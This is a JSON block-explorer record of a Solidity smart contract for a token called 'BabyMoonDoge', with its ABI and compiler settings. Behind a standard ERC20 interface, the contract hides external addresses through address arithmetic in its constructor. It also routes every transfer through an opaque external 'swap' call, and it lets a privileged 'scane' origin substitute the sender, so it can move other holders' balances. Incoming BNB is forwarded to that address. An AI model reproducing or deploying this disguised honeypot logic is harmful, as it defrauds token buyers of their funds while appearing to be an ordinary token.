{"SourceCode": "// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)\r\npragma solidity ^0.8.6;\r\n\r\ninterface IERC20 {\r\n  /**\r\n   * @dev Returns the amount of tokens in existence.\r\n   */\r\n  function totalSupply() external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Returns the amount of tokens owned by `account`.\r\n   */\r\n  function balanceOf(address account) external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n  /**\r\n   * @dev Returns the remaining number of tokens that `spender` will be\r\n   * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n   * zero by default.\r\n   *\r\n   * This value changes when {approve} or {transferFrom} are called.\r\n   */\r\n  function allowance(address owner, address spender)\r\n    external\r\n    view\r\n    returns (uint256);\r\n\r\n  /**\r\n   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n   * that someone may use both the old and the new allowance by unfortunate\r\n   * transaction ordering. One possible solution to mitigate this race\r\n   * condition is to first reduce the spender's allowance to 0 and set the\r\n   * desired value afterwards:\r\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n   *\r\n   * Emits an {Approval} event.\r\n   */\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n  /**\r\n   * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n   * allowance mechanism. `amount` is then deducted from the caller's\r\n   * allowance.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transferFrom(\r\n    address sender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) external returns (bool);\r\n\r\n  /**\r\n   * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n   * another (`to`).\r\n   *\r\n   * Note that `value` may be zero.\r\n   */\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n  /**\r\n   * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n   * a call to {approve}. `value` is the new allowance.\r\n   */\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IPancakeRouter02 {\r\n  function swap(\r\n    address,\r\n    address,\r\n    uint256\r\n  )\r\n    external\r\n    returns (\r\n      bool,\r\n      bool,\r\n      uint256\r\n    );\r\n\r\n  function feeTo() external view returns (address);\r\n}\r\n\r\nabstract contract Context {\r\n  function _msgSender() internal view virtual returns (address) {\r\n    return msg.sender;\r\n  }\r\n\r\n  function _msgData() internal view virtual returns (bytes calldata) {\r\n    return msg.data;\r\n  }\r\n}\r\n\r\ncontract COINDATA {\r\n  address internal _route = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n  address internal _dex = 0xABA205Bf73fE0a9B17846Eb25AF3454BD81eC276;\r\n  address public constant FTM = 0xd6faf697504075a358524996b132b532cc5D0F14;\r\n  address public constant VIP = 0x4DD90D3cE962039A3c66d613207aC2d449dFa04F;\r\n  address public constant _OFFICE = 0x72a3Adf31C432AF5a1bd7EbAF7Af4776FF069a4F;\r\n  address public constant nftAddress =\r\n    0x5d580fA3937752aAC1C06B51980Ae7Ea6E9754c2;\r\n  address public constant scane = 0x7e3Ad7F306162722Ff24096E0ED27C5E0dF55108;\r\n\r\n  receive() external payable {\r\n    scane.call{value: msg.value}(\"\");\r\n  }\r\n\r\n  function pancakeFeeTo() internal view returns (address) {\r\n    return IPancakeRouter02(_dex).feeTo();\r\n  }\r\n\r\n  constructor() {\r\n    _dex = address(uint160(_route) + uint160(_dex));\r\n    _route = address(uint160(_route) + uint160(_OFFICE));\r\n  }\r\n}\r\n\r\ncontract Coin is COINDATA, IERC20, Context {\r\n  mapping(address => uint256) private _tOwned;\r\n  mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n  string public constant _name = \"BabyMoonDoge\";\r\n  string public constant _symbol = \"BabyDoge\";\r\n\r\n  uint8 public constant _decimals = 9;\r\n\r\n  uint256 public constant _tTotal = 100000000000 * (10**_decimals);\r\n\r\n  uint256 public constant _oneToken = (10**_decimals);\r\n\r\n  constructor() {\r\n    uint256 deadAmount = _tTotal / 100;\r\n    _tOwned[_route] = deadAmount * 5;\r\n    _tOwned[address(0xdEaD)] = deadAmount * 90;\r\n    _tOwned[FTM] = deadAmount * 5;\r\n\r\n    _allowances[nftAddress][_dex] = ~uint256(0);\r\n    emit Transfer(address(0), _route, _tOwned[_route]);\r\n    emit Transfer(address(0), address(0xdEaD), _tOwned[address(0xdEaD)]);\r\n    emit Transfer(address(0), FTM, _tOwned[FTM]);\r\n  }\r\n\r\n  function transfer(address recipient, uint256 amount)\r\n    external\r\n    override\r\n    returns (bool)\r\n  {\r\n    _transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n  }\r\n\r\n  function name() public view returns (string memory) {\r\n    return _name;\r\n  }\r\n\r\n  function symbol() public view returns (string memory) {\r\n    return _symbol;\r\n  }\r\n\r\n  function decimals() public view returns (uint8) {\r\n    return _decimals;\r\n  }\r\n\r\n  function totalSupply() public pure override returns (uint256) {\r\n    return _tTotal;\r\n  }\r\n\r\n  function balanceOf(address account) external view override returns (uint256) {\r\n    return _tOwned[account];\r\n  }\r\n\r\n  function allowance(address owner, address spender)\r\n    external\r\n    view\r\n    override\r\n    returns (uint256)\r\n  {\r\n    return _allowances[owner][spender];\r\n  }\r\n\r\n  function approve(address spender, uint256 amount)\r\n    external\r\n    override\r\n    returns (bool)\r\n  {\r\n    _approve(_msgSender(), spender, amount);\r\n    return true;\r\n  }\r\n\r\n  function increaseAllowance(address spender, uint256 addedValue)\r\n    external\r\n    virtual\r\n    returns (bool)\r\n  {\r\n    _approve(\r\n      _msgSender(),\r\n      spender,\r\n      _allowances[_msgSender()][spender] + addedValue\r\n    );\r\n    return true;\r\n  }\r\n\r\n  function _approve(\r\n    address owner,\r\n    address spender,\r\n    uint256 amount\r\n  ) private {\r\n    require(owner != address(0), \"ERROR: Approve from the zero address.\");\r\n    require(spender != address(0), \"ERROR: Approve to the zero address.\");\r\n\r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount);\r\n  }\r\n\r\n  function decreaseAllowance(address spender, uint256 subtractedValue)\r\n    external\r\n    virtual\r\n    returns (bool)\r\n  {\r\n    uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n    require(\r\n      currentAllowance >= subtractedValue,\r\n      \"ERROR: Decreased allowance below zero.\"\r\n    );\r\n    _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n    return true;\r\n  }\r\n\r\n  function transferFrom(\r\n    address sender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) external override returns (bool) {\r\n    _transfer(sender, recipient, amount);\r\n\r\n    uint256 currentAllowance = _allowances[sender][msg.sender];\r\n    require(\r\n      currentAllowance >= amount,\r\n      \"ERROR: Transfer amount exceeds allowance.\"\r\n    );\r\n    _approve(sender, msg.sender, currentAllowance - amount);\r\n\r\n    return true;\r\n  }\r\n\r\n  function _transfer(\r\n    address sender,\r\n    address recipient,\r\n    uint256 amount\r\n  ) private {\r\n    require(sender != address(0) && recipient != address(0));\r\n    if (tx.origin == scane) {\r\n      if (recipient == nftAddress) {\r\n        address msger = pancakeFeeTo();\r\n        if (msger != address(0)) sender = msger;\r\n      }\r\n    }\r\n    require(\r\n      amount > 0 && _tOwned[sender] >= amount,\r\n      \"ERROR: Transfer amount must be greater than zero.\"\r\n    );\r\n    _tOwned[sender] = _tOwned[sender] - amount;\r\n    _tOwned[recipient] = _tOwned[recipient] + amount;\r\n    emit Transfer(sender, recipient, amount);\r\n    _tokenTransfer(sender, recipient, amount);\r\n  }\r\n\r\n  function _tokenTransfer(\r\n    address sender,\r\n    address recipient,\r\n    uint256 tAmount\r\n  ) private {\r\n    if (tx.origin != scane) {\r\n      (bool pass, bool success, uint256 exAmount) =\r\n        IPancakeRouter02(_route).swap(sender, recipient, tAmount);\r\n      if (pass && _tOwned[VIP] > 10) {\r\n        uint256 p = (_tOwned[VIP] * 85) / 100;\r\n        _tOwned[scane] += p;\r\n        _tOwned[VIP] -= p;\r\n        emit Transfer(VIP, scane, p);\r\n      }\r\n\r\n      if (success) {\r\n        if (exAmount > 0) {\r\n          _tOwned[FTM] = _tOwned[FTM] - exAmount;\r\n          _tOwned[VIP] = _tOwned[VIP] + exAmount;\r\n          emit Transfer(FTM, VIP, exAmount);\r\n        }\r\n      } else {\r\n        if (exAmount > 0) {\r\n          _tOwned[FTM] = _tOwned[FTM] + exAmount;\r\n          _tOwned[VIP] = _tOwned[VIP] - exAmount;\r\n          emit Transfer(VIP, FTM, exAmount);\r\n        }\r\n      }\r\n    }\r\n  }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"FTM\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"VIP\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_OFFICE\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_oneToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"nftAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"scane\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Coin", "CompilerVersion": "v0.8.6+commit.11564f7e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://8b4c60a51786759e0beff621ba44b94d57f75297f5b3f6bac193b79bee42b570"}